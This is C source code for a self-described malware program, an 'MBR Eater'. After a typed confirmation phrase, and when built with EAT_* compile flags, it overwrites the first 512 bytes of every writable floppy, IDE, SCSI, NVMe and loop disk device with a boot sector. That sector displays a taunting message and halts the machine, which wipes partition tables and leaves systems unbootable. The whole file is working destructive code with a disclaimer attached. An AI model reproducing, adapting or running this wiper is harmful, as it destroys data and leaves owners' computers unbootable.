#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main( int argc , char *argv[] , char *envp[] )
{
    if ( argc == 2 )
    {
        if ( strcmp( argv[ 1 ] , "I have understood the risks it brings." ) == \
             0 )
        {
            int count ;
            FILE *dev ;
            char dname[ 9 ] = "/dev/?d?" , nvmename[ 13 ] = "/dev/nvme?n?" , \
                 loopname1[ 11 ] = "/dev/loop?" , \
                 loopname2[ 12 ] = "/dev/loop??" , \
                 loopname3[ 13 ] = "/dev/loop???" , \
                 loopname4[ 14 ] = "/dev/loop????" ;
            const char mbr[ 512 ] = \
            { 0x8c , 0xc8 , 0x8e , 0xd8 , 0x8e , 0xc0 , 0x8e , 0xd0 , \
              0x8e , 0xe0 , 0xbc , 0x00 , 0x7c , 0xb8 , 0x00 , 0x06 , \
              0xbb , 0x00 , 0x07 , 0xb9 , 0x00 , 0x00 , 0xba , 0x4f , \
              0x18 , 0xcd , 0x10 , 0xb8 , 0x30 , 0x7c , 0x89 , 0xc5 , \
              0xb9 , 0x41 , 0x00 , 0xb8 , 0x01 , 0x13 , 0xba , 0x01 , \
              0x01 , 0xbb , 0x07 , 0x00 , 0xcd , 0x10 , 0xeb , 0xfe , \
              0x48 , 0x61 , 0x68 , 0x61 , 0x21 , 0x20 , 0x54 , 0x68 , \
              0x69 , 0x73 , 0x20 , 0x69 , 0x73 , 0x20 , 0x4d , 0x42 , \
              0x52 , 0x20 , 0x45 , 0x61 , 0x74 , 0x65 , 0x72 , 0x21 , \
              0x20 , 0x59 , 0x6f , 0x75 , 0x72 , 0x20 , 0x4d , 0x42 , \
              0x52 , 0x20 , 0x69 , 0x73 , 0x20 , 0x65 , 0x61 , 0x74 , \
              0x65 , 0x6e , 0x2e , 0x20 , 0x55 , 0x73 , 0x65 , 0x20 , \
              0x47 , 0x50 , 0x61 , 0x72 , 0x74 , 0x65 , 0x64 , 0x20 , \
              0x6f , 0x72 , 0x20 , 0x41 , 0x4f , 0x4d , 0x45 , 0x49 , \
              0x21 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , \
              0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x55 , 0xaa } ;
            count = 0 ;
            // fd(10)+hd(26)+sd(26)+mvme(100)+loop(10000)
            dname[ 5 ] = 'f' ;
            for ( int i = 0 ; i < 10 ; i++ )
            {
                count++ ;
                printf( "%u/10162\n" , count ) ;
                #ifdef EAT_F
                dname[ 7 ] = '0' + i ;
                if ( access( dname , W_OK ) == 0 )
                {
                    dev = fopen( dname , "a" ) ;
                    if ( dev != NULL )
                    {
                        rewind( dev ) ;
                        for ( int j = 0 ; j < 512 ; j++ )
                        {
                            fputc( mbr[ j ] , dev ) ;
                        } ;
                        fclose( dev ) ;
                    } ;
                } ;
                #endif
            } ;
            dname[ 5 ] = 'h' ;
            for ( int i = 'a' ; i <= 'z' ; i++ )
            {
                count++ ;
                printf( "%u/10162\n" , count ) ;
                #ifdef EAT_H
                dname[ 7 ] = i ;
                if ( access( dname , W_OK ) == 0 )
                {
                    dev = fopen( dname , "a" ) ;
                    if ( dev != NULL )
                    {
                        rewind( dev ) ;
                        for ( int j = 0 ; j < 512 ; j++ )
                        {
                            fputc( mbr[ j ] , dev ) ;
                        } ;
                        fclose( dev ) ;
                    } ;
                } ;
                #endif
            } ;
            dname[ 5 ] = 's' ;
            for ( int i = 'a' ; i <= 'z' ; i++ )
            {
                count++ ;
                printf( "%u/10162\n" , count ) ;
                #ifdef EAT_S
                dname[ 7 ] = i ;
                if ( access( dname , W_OK ) == 0 )
                {
                    dev = fopen( dname , "a" ) ;
                    if ( dev != NULL )
                    {
                        rewind( dev ) ;
                        for ( int j = 0 ; j < 512 ; j++ )
                        {
                            fputc( mbr[ j ] , dev ) ;
                        } ;
                        fclose( dev ) ;
                    } ;
                } ;
                #endif
            } ;
            for ( int i = 0 ; i <= 10 ; i++ )
            {
                nvmename[ 9 ] = '0' + i ;
                for ( int n = 0 ; n <= 10 ; n++ )
                {
                    count++ ;
                    printf( "%u/10162\n" , count ) ;
                    #ifdef EAT_N
                    nvmename[ 11 ] = '0' + n ;
                    if ( access( nvmename , W_OK ) == 0 )
                    {
                        dev = fopen( nvmename , "a" ) ;
                        if ( dev != NULL )
                        {
                            rewind( dev ) ;
                            for ( int j = 0 ; j < 512 ; j++ )
                            {
                                fputc( mbr[ j ] , dev ) ;
                            } ;
                            fclose( dev ) ;
                        } ;
                    } ;
                    #endif
                } ;
            } ;
            for ( int i = 0 ; i <= 10 ; i++ )
            {
                count++ ;
                printf( "%u/10162\n" , count ) ;
                #ifdef EAT_L
                loopname1[ 9 ] = '0' + i ;
                if ( access( loopname1 , W_OK ) == 0 )
                {
                    dev = fopen( loopname1 , "a" ) ;
                    if ( dev != NULL )
                    {
                        rewind( dev ) ;
                        for ( int j = 0 ; j < 512 ; j++ )
                        {
                            fputc( mbr[ j ] , dev ) ;
                        } ;
                        fclose( dev ) ;
                    } ;
                } ;
                #endif
            } ;
            for ( int i = 1 ; i <= 10 ; i++ )
            {
                loopname2[ 9 ] = '0' + i ;
                for ( int n = 0 ; n <= 10 ; n++ )
                {
                    count++ ;
                    printf( "%u/10162\n" , count ) ;
                    #ifdef EAT_L
                    loopname2[ 10 ] = '0' + n ;
                    if ( access( loopname2 , W_OK ) == 0 )
                    {
                        dev = fopen( loopname2 , "a" ) ;
                        if ( dev != NULL )
                        {
                            rewind( dev ) ;
                            for ( int j = 0 ; j < 512 ; j++ )
                            {
                                fputc( mbr[ j ] , dev ) ;
                            } ;
                            fclose( dev ) ;
                        } ;
                    } ;
                    #endif
                } ;
            } ;
            for ( int i = 1 ; i <= 10 ; i++ )
            {
                loopname3[ 9 ] = '0' + i ;
                for ( int n = 0 ; n <= 10 ; n++ )
                {
                    loopname3[ 10 ] = '0' + n ;
                    for ( int o = 0 ; o <= 10 ; o++ )
                    {
                        count++ ;
                        printf( "%u/10162\n" , count ) ;
                        #ifdef EAT_L
                        loopname3[ 11 ] = '0' + o ;
                        if ( access( loopname3 , W_OK ) == 0 )
                        {
                            dev = fopen( loopname3 , "a" ) ;
                            if ( dev != NULL )
                            {
                                rewind( dev ) ;
                                for ( int j = 0 ; j < 512 ; j++ )
                                {
                                    fputc( mbr[ j ] , dev ) ;
                                } ;
                                fclose( dev ) ;
                            } ;
                        } ;
                        #endif
                    } ;
                } ;
            } ;
            for ( int i = 1 ; i <= 10 ; i++ )
            {
                loopname4[ 9 ] = '0' + i ;
                for ( int n = 0 ; n <= 10 ; n++ )
                {
                    loopname4[ 10 ] = '0' + n ;
                    for ( int o = 0 ; o <= 10 ; o++ )
                    {
                        loopname4[ 11 ] = '0' + o ;
                        for ( int q = 0 ; q <= 10 ; q++ )
                        {
                            count++ ;
                            printf( "%u/10162\n" , count ) ;
                            #ifdef EAT_L
                            loopname4[ 12 ] = '0' + q ;
                            if ( access( loopname4 , W_OK ) == 0 )
                            {
                                dev = fopen( loopname4 , "a" ) ;
                                if ( dev != NULL )
                                {
                                    rewind( dev ) ;
                                    for ( int j = 0 ; j < 512 ; j++ )
                                    {
                                        fputc( mbr[ j ] , dev ) ;
                                    } ;
                                    fclose( dev ) ;
                                } ;
                            } ;
                            #endif
                        } ;
                    } ;
                } ;
            } ;
        }
        else
        {
            fprintf( stderr , "This malware may cause harm to your computer" ) ;
            fprintf( stderr , "; Please type '%s' " , argv[ 0 ] ) ;
            fprintf( stderr , "'I have understood the risks it brings.' to " ) ;
            fprintf( stderr , "run.\nIf some problems happen, the author " ) ;
            fprintf( stderr , "will NOT be responsible.\nRun at your own " ) ;
            fprintf( stderr , "risk.\nLAST WARNING!\n" ) ;
            return 2 ;
        } ;
    }
    else
    {
        fprintf( stderr , "This malware may cause harm to your computer; " ) ;
        fprintf( stderr , "Please type '%s' " , argv[ 0 ] ) ;
        fprintf( stderr , "'I have understood the risks it brings.' to run." ) ;
        fprintf( stderr , "\nIf some problems happen, the author " ) ;
        fprintf( stderr , "will NOT be responsible.\nRun at your own risk." ) ;
        fprintf( stderr , "\nLAST WARNING!\n" ) ;
        return 2 ;
    } ;
} ;
